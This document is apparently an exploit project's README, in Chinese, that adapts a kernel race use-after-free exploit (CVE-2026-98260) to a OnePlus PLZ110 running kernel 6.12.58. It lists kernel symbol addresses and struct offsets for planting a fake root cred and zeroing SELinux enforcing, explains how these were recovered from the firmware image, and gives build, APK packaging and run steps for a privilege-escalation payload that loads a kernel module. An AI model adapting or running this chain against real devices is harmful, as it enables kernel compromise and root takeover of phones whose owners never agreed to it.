# PLZ110 6.12.58 CVE-2026-98260 适配（新增 profile）

与 `rust-t61269`（PLZ110 6.12.69）同源、同一物理链路，只有 per-build 常量不同。
**不改动 6.12.69 / 6.18.21 / V2505A 三条既有入口**，新增一个编译期分支和一个独立 `.so`。

## 状态

常量已从 OTA `boot.img` 的内核 Image 静态恢复，并用镜像自带的 `.BTF` 交叉校验了
slab 与结构体布局。**尚需真机验证**：先跑只读 `probe`，再跑完整 `run`。

## 目标

- 机型：OnePlus PLZ110（SM8850 / canoe），Android 17
- 内核：`6.12.58-android16-6-g7704a1ae279b-ab15213644-4k`（`CONFIG_LOCALVERSION="-4k"`）
- 配置要点：`KALLSYMS=y`、`KALLSYMS_ALL=y`、`RANDOMIZE_BASE=y`、`CFI_CLANG=y`、
  `RANDSTRUCT_NONE=y`、`KASAN=y`（编译进但未启用）、`SECURITY_SELINUX_DEVELOP=y`

## 常量

```c
#define TARGET_KERNEL_RELEASE      "6.12.58-android16-6-g7704a1ae279b-ab15213644-4k"

/* do_timer_create = 0xffffffc080517e3c，bl kmem_cache_alloc_noprof @ +0xa4 */
#define STATIC_TIMER_SITE          0xffffffc080517ee8ULL   /* 返回地址 +0xa8 */
#define TIMER_SITE_LOW21           0x117ee8ULL

/* kallsyms 链接期地址 */
#define SELINUX_STATE_STATIC       0xffffffc0827b5948ULL   /* enforcing @ +0x0 */
#define PANIC_ON_WARN_STATIC       0xffffffc08251afe0ULL

/* copy_process = 0xffffffc0801aaebc，内联 dup_task_struct 里
 * ldr x0,[task_struct_cachep] 后 bl kmem_cache_alloc_node_noprof @ +0x154 */
#define COPY_PROCESS_LOW21         0x1ab018ULL             /* 返回地址 +0x158 */

/* fake cred 引用计数子对象 */
#define ROOT_USER_STATIC           0xffffffc082542360ULL
#define INIT_USER_NS_STATIC        0xffffffc0825420e8ULL
#define INIT_UCOUNTS_STATIC        0xffffffc082543cf8ULL
#define INIT_GROUPS_STATIC         0xffffffc082543828ULL
```

结构布局（BTF 实测，与 6.12.69 完全一致，代码里无需改动）：

| 对象 | 值 |
| --- | --- |
| `struct k_itimer` | 0x100，`it`（rb node）@ 0x78 |
| `struct cred` | 0xb8，uid/gid @ 0x8，euid @ 0x18，caps 0x30–0x50，security @ 0x80 |
| `struct task_struct` | 0x1440，`cred` @ 0x900 |
| `struct selinux_state` | 0x80，`enforcing` @ 0x0（故 `state - 7` 的 8 字节零写可清掉它）|
| `struct task_security_struct` | 0x18，exec_sid @ 0x8，create_sid @ 0xc |

## 恢复方法（可复现）

镜像本身是裸 arm64 Image（41 236 992 字节，boot header v4、无 ramdisk、kernel 偏移 0x1000）。
下面的常量由 `recover.py` 从同一份 Image 自动重算，输出与本 profile 完全一致：

```bash
python3 recover.py kernel.bin      # kernel.bin = boot.img[0x1000 : 0x1000+kernel_size]
```

1. **取 release**：全文搜 `6.12.\d+-\w+` 得到 `linux_banner`。
2. **kallsyms**：names 是 token 压缩格式，但本镜像里各表的相对顺序为
   `num_syms(u64) → names → markers → token_table → token_index → offsets → relative_base`，
   与上游 `scripts/kallsyms.c` 的输出顺序不同，所以按"先找 token table、再反推"的方式定位：

   | 表 | 偏移 |
   | --- | --- |
   | `kallsyms_num_syms` | 0x14e2b80（= 128498）|
   | `kallsyms_names` | 0x14e2b88 .. 0x16d7e34 |
   | `kallsyms_markers` | 0x16d7e38 .. 0x16d8610（502 项）|
   | `kallsyms_token_table` | 0x16d8610 |
   | `kallsyms_token_index` | 0x16d89a8（256×u16）|
   | `kallsyms_offsets` | 0x16d8ba8 .. 0x1756370（s32 × 128498）|
   | `kallsyms_relative_base` | 0x1756370（= 0xffffffc080000000）|

   地址 = `relative_base + offsets[i]`，解码后 128 498 个符号全序单调（0 个逆序），
   即解析自洽。
3. **.BTF**：0x19e483c（magic 0xeb9f），`type_len` 4 182 940、`str_len` 2 719 182，
   用来出上表的结构体偏移，并确认 `TIMER_ALLOC=0x100`、`CRED_REQ=0xb8`、
   `CRED_ALLOC=0xc0`（`HWCACHE_ALIGN` 后缓存对象大小）、`TASK_ALLOC=0x1440`。
4. **调用点**：按符号表反汇编，扫 `BL`（0x94000000）到
   `kmem_cache_alloc_noprof` / `kmem_cache_alloc_node_noprof`，
   并用前一条 `adrp/ldr` 是否加载 `posix_timers_cache` / `task_struct_cachep` 做确认。
   ftrace 记录的是返回地址（`_RET_IP_`），故 site = BL 地址 + 4。

> 注意 `do_timer_create` 里有**两个** `posix_timers_cache` 分配点（+0xa8 与 +0x588），
> 这里取主路径的前者。若真机上 `PROBE_TIMER recs=0`，说明走的是另一条路径，
> 把 `STATIC_TIMER_SITE` 换成 `0xffffffc0805183c8`、`TIMER_SITE_LOW21` 换成 `0x1183c8` 再试。

## 构建

```bash
cd exploit/rust-t61269
cargo build --release --target aarch64-linux-android --features plz110_61258
# 产物复制为 App 原生库名（与既有入口同样的处理方式）
cp target/aarch64-linux-android/release/t61269 \
   ../../app/app/src/main/jniLibs/arm64-v8a/libt61258.so
```

`build.rs` 会为这个 feature 追加 `-DKERNEL_61258`，`Cargo.toml` 对应
`plz110_61258 = []`。

### 在 arm64 主机（如 Termux / arm64 chroot）上交叉编译

NDK 自带的 `prebuilt/linux-x86_64/bin/clang` 是 x86_64 可执行文件，arm64 主机跑不了，
但 sysroot 与 compiler-rt 只是数据文件，可以让宿主 clang 直接用：

```sh
NDK=$ANDROID_NDK_HOME            # 例：/opt/android-sdk/ndk/29.0.14206865
SYS=$NDK/toolchains/llvm/prebuilt/linux-x86_64/sysroot
RT=$(echo $NDK/toolchains/llvm/prebuilt/linux-x86_64/lib/clang/*/lib/linux)
# 包装脚本：把宿主 clang 指向 android31 + NDK sysroot
exec clang --target=aarch64-linux-android31 --sysroot=$SYS \
     -fuse-ld=lld --rtlib=compiler-rt -L$RT/aarch64 -L$RT "$@"
# -L$RT/aarch64 用来提供 NDK 的 libunwind.a（rustc 会显式 -lunwind）
```

再把这个包装脚本放到 `<shim>/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android31-clang`，
令 `ANDROID_NDK_HOME=<shim>` 且
`CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER=<shim 里的包装脚本>` 即可
（`CARGO_TARGET_*` 环境变量优先于 `.cargo/config.toml` 里的 darwin 路径）。

另外 `.cargo/config.toml` 里的 `-Wl,-z,max-page-size=16384` 必须保留，
Android 15+ 要求 16 KB 页对齐；产物 `LOAD` 段 `Align` 应为 `0x4000`。

**注意**：仓库若位于 `/sdcard`（FUSE，noexec）下，cargo 无法执行 build script，
需要把 `CARGO_TARGET_DIR` 指到根文件系统（如 `/root/build/target`）。

### 在 arm64 Linux 上打包 APK（没有 x86 工具链时）

`build-tools` 里的 `aapt2`/`zipalign`/`aapt` 是 x86-64 ELF，arm64 主机不注册 binfmt
就跑不了。可行做法是 qemu-user + AGP 的 aapt2 覆盖：

```sh
# 1) 装 x86-64 运行库（Debian）
dpkg --add-architecture amd64 && apt-get update
apt-get install -y --no-install-recommends libc6:amd64 libstdc++6:amd64 \
    libgcc-s1:amd64 zlib1g:amd64
# 2) 包一层 qemu，可执行文件必须命名为 aapt2（AGP 会校验）
mkdir -p /root/aapt2shim && cat > /root/aapt2shim/aapt2 <<'EOF'
#!/bin/sh
exec /usr/bin/qemu-x86_64-static /opt/android-sdk/build-tools/37.0.0/aapt2 "$@"
EOF
chmod 755 /root/aapt2shim/aapt2
# 3) 构建
cd app && ./gradlew --no-daemon \
  -Pandroid.aapt2FromMavenOverride=/root/aapt2shim/aapt2 assembleDebug
```

两个要点：覆盖路径指向的脚本**不能**改名（如 `aapt2-qemu` 会被 AGP 拒绝，
报 "Custom AAPT2 location does not point to an AAPT2 executable"）；
`binfmt_misc` 在部分 Android 内核上注册会直接返回 `EINVAL`，不要指望透明执行。


## App 侧

- `ExploitKind.CVE61258("CVE-2026-98260-6.12.58")`，按 `uname -r` 含 `6.12.58` 自动选中
- 入口：`nativeLibraryDir/libt61258.so run`
- SUSFS 走 `libsusfs_guard_lkm_612.so`；VFS 开关不开放（与 6.12.69 一致）

## 验证顺序

1. 只读自检（不 race、不回收、不写内核）：
   `libt61258.so probe` → 期望 `PROBE_KERNEL`、`PROBE_TIMER ... low21=0x117ee8`、
   `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_TASK/PROBE_CRED`、`PROBE_OK`
2. 完整链路：`libt61258.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` / `MODULE_LOADED`
3. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试

竞态 UAF 本身可能导致 panic/重启；仅用于自有设备。
